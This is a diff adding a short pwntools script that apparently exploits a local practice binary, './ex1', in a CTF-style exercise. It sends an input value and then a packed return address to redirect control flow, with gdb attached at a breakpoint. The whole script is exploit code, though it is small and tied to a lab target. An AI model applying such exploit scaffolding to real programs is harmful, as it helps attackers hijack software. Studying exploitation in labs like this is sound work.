@@ -1,0 +1,27 @@
+from pwn import *
+
+#p = gdb.debug(args=['./ex0'],gdbscript='r')
+
+p=process('./ex1')
+
+
+
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+
+
+
+context.log_level='debug'
+
+p.sendline('24')
+
+
+payload=p32(0x080484ed)
+gdb.attach(proc.pidof(p)[0],gdbscript='b *0x0804851c')
+
+
+
+p.sendline(payload)
+
+pause()
+
+p.recvline()
